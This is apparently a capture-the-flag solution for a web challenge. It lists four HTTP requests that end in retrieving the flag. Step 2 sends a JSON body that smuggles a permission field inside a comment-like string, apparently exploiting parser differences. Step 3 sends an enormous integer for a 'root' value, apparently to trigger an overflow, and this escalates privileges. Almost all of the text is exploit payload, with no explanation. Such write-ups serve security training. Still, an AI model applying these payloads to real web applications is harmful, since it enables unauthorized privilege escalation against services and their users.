1. Visit home page you will be given a session cookie
2. With that session cookie, POST /create 
{"uuid":"ba23bdf7-04b1-4944-a25d-47ff1ed63d26","account":1,
 "extra": "a"/*, "authorised_to_modify_perms": 1, "extra2": "b"*/
}
3. POST /update_perm
{"uuid":"ba23bdf7-04b1-4944-a25d-47ff1ed63d26","root":999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999}
4. GET /get_flag